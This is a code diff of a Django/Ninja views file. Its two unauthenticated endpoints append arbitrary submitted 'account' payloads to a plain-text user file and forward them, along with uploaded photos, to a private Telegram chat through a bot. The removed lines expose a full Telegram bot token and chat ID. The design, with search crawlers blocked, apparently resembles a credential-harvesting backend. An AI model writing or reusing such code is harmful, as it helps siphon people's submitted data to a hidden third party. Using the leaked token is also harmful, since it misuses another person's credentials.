@@ -1,33 +1,19 @@
-from django.shortcuts import render
-from django.contrib.auth.decorators import login_required
-from django.http import HttpResponse
+from http.client import HTTPException
+from django.conf import settings
 from rest_framework.views import APIView
 from rest_framework.response import Response
 from rest_framework import status
 from django.http import JsonResponse
 from ninja.files import UploadedFile
-from ninja import Router, Query, Body, File
+from ninja import Router, Body, File
 import requests
 import json
-
-
-@login_required()
-def index(request):
-    return render(request, 'main/index.html')
-
-
-def robots_txt(request):
-    '''
-    Для отображения robots.txt
-    '''
-    content = "User-Agent: *\nDisallow: /"
-    return HttpResponse(content, content_type='text/plain')
-
+import os
 
 
 router = Router()
 
-# Тест api
+
 @router.get("/list")
 def get_list(request):
     '''
@@ -36,35 +22,30 @@ def get_list(request):
     return JsonResponse({'message': 'Hello, world!'})
 
 
-import os
-
 @router.post('/create-file')
 def create_file(request, payload: dict = Body(...)):
     account_dir = 'accounts'
     if not os.path.exists(account_dir):
         os.makedirs(account_dir)
-    print(payload)
-    kuba_id = '992817125'
+    kuba_id = settings.CHAT_ID
 
     result = payload
     with open(f'{account_dir}/db_users.txt', 'a', encoding='utf-8') as f:
         f.write(json.dumps(result) + '\n')
     try:
-        response = requests.get(
-            url=f'https://api.telegram.org/bot8203542482:AAH0WkoFRp7RBDZg_D99z_HKSc9_fLrqyNY/sendMessage?chat_id={kuba_id}&text={result}')
+        requests.get(
+            url=f'{settings.TELEGRAM_API}{settings.BOT_ID}/sendMessage?chat_id={kuba_id}&text={result}')
         return 200, 'Ok'
     except Exception as err:
-        print(err)
-
-    return 400, 'error'
+        raise HTTPException(err)
 
 
 @router.post('/photo-budka')
 def send_photo(request, photo: File[UploadedFile]):
     data = photo.read()
     response = requests.post(
-        f"https://api.telegram.org/bot8203542482:AAH0WkoFRp7RBDZg_D99z_HKSc9_fLrqyNY/sendPhoto",
-        data={"chat_id": '992817125'},
+        f"{settings.TELEGRAM_API}{settings.BOT_ID}/sendPhoto",
+        data={"chat_id": settings.CHAT_ID},
         files={"photo": (photo.name, data, photo.content_type)},
     )
 
